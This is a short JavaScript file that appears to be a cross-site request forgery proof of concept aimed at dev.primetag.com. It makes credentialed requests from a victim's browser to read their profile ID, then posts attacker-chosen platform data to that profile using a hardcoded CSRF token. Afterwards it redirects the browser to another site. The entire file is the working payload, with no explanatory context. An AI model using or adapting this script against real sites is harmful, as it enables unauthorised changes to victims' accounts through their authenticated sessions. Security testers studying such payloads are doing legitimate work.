var payload = {
    "name": "ananuneninamu.com",
    "url": "annaninninamu.com",
    "audience_total": 3
};
var token = 'OzHthH9Lsxjyx1jQv3HCoFwv3jqdQkYwucXLnzjQwjWadqde6wjt9LcpKyqi4Kc5';
var id = '';
function getprofid(){
    var url = 'https://dev.primetag.com/profile'
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            id = xhr.responseURL.substr(xhr.responseURL.length - 4);
        };
    };
    xhr.open('GET', url, true);xhr.withCredentials = "true";
    xhr.send(null);
}
function postdata() {
    var url = 'https://dev.primetag.com/api/profiles/'+id+'/platforms/4';
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            console.log(xhr.responseText);
            window.location = 'https://dnsleaktest.com';
        };
    };
    xhr.open('POST', url, true);
    xhr.setRequestHeader('X-CSRFToken', token);
    xhr.withCredentials = "true";
    xhr.send(JSON.stringify(payload));
};
getprofid();
postdata();
